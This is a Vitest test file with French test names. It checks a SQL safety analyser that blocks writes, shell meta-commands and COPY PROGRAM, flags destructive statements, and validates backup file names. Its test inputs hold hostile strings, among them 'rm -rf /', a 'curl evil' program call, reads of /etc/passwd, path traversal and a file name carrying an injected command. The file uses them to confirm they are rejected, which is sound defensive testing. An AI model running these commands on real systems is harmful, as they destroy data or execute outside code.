import { describe, expect, it } from 'vitest';
import { analyzeSql, backupName, isValidBackupName, parseCsv, parseMysqlBatch, stripSqlLiterals } from './database';
import { SafetyViolation } from './errors';

describe('analyzeSql — lecture seule', () => {
	it('accepte SELECT / WITH / EXPLAIN', () => {
		expect(analyzeSql('SELECT * FROM notes LIMIT 5;', 'postgres', true).readOnly).toBe(true);
		expect(analyzeSql('with x as (select 1) select * from x', 'postgres', true).readOnly).toBe(true);
		expect(analyzeSql('EXPLAIN SELECT 1', 'mysql', true).readOnly).toBe(true);
	});

	it('refuse les écritures et la sortie de transaction', () => {
		for (const sql of [
			'DELETE FROM notes',
			'SELECT 1; DROP TABLE notes',
			'SELECT 1; COMMIT; DELETE FROM notes',
			"SELECT set_config('default_transaction_read_only', 'off', false)",
			'SET default_transaction_read_only = off',
			"SELECT * INTO OUTFILE '/tmp/x' FROM users"
		]) {
			expect(() => analyzeSql(sql, sql.includes('OUTFILE') ? 'mysql' : 'postgres', true), sql).toThrow(SafetyViolation);
		}
	});

	it('ignore les mots-clés dans les chaînes et commentaires', () => {
		expect(analyzeSql("SELECT 'drop table x; commit' AS t -- delete from y", 'postgres', true).readOnly).toBe(true);
		expect(analyzeSql('SELECT $$; delete from x$$', 'postgres', true).readOnly).toBe(true);
	});
});

describe('analyzeSql — toujours interdit', () => {
	it('refuse les méta-commandes du client (shell dans le conteneur)', () => {
		expect(() => analyzeSql('\\! rm -rf /', 'postgres', false)).toThrow(SafetyViolation);
		expect(() => analyzeSql('select 1;\n\\! id', 'mysql', false)).toThrow(SafetyViolation);
		expect(() => analyzeSql('system id', 'mysql', false)).toThrow(SafetyViolation);
		expect(() => analyzeSql('SELECT 1;\nsource /etc/passwd', 'mariadb', false)).toThrow(SafetyViolation);
	});

	it("refuse COPY … PROGRAM même en mode écriture", () => {
		expect(() => analyzeSql("COPY notes TO PROGRAM 'curl evil'", 'postgres', false)).toThrow(SafetyViolation);
	});

	it('accepte un antislash dans une chaîne', () => {
		expect(analyzeSql("SELECT * FROM t WHERE a LIKE 'x\\_y'", 'postgres', true).readOnly).toBe(true);
	});
});

describe('analyzeSql — opérations destructrices', () => {
	it('les repère pour exiger une confirmation', () => {
		expect(analyzeSql('DROP TABLE notes', 'postgres', false).destructive).toContain('DROP');
		expect(analyzeSql('TRUNCATE notes', 'postgres', false).destructive).toContain('TRUNCATE');
		expect(analyzeSql('DELETE FROM notes', 'postgres', false).destructive).toContain('DELETE sans WHERE');
		expect(analyzeSql("UPDATE users SET name = 'x'", 'mysql', false).destructive).toContain('UPDATE sans WHERE');
		expect(analyzeSql('DELETE FROM notes WHERE id = 3', 'postgres', false).destructive).toEqual([]);
		expect(analyzeSql("INSERT INTO tags (name) VALUES ('drop')", 'postgres', false).destructive).toEqual([]);
	});
});

describe('utilitaires', () => {
	it('noms de sauvegarde valides uniquement', () => {
		const n = backupName('manual', new Date(Date.UTC(2026, 9, 14, 3, 30, 0)));
		expect(n).toBe('20261014-033000-manual.sql.gz');
		expect(isValidBackupName(n)).toBe(true);
		expect(isValidBackupName('../../etc/passwd')).toBe(false);
		expect(isValidBackupName("x'; rm -rf /; '.sql.gz")).toBe(false);
	});

	it('parse le CSV de psql et le TSV de mysql', () => {
		expect(parseCsv('id,body\n1,"a, ""b""\nc"\n')).toEqual([['id', 'body'], ['1', 'a, "b"\nc']]);
		expect(parseMysqlBatch('id\tbody\n1\ta\\tb\\nc\n')).toEqual([['id', 'body'], ['1', 'a\tb\nc']]);
	});

	it('retire les littéraux', () => {
		expect(stripSqlLiterals("select 'a;b' /* c */ from \"t;x\"", 'postgres')).not.toContain(';');
	});
});
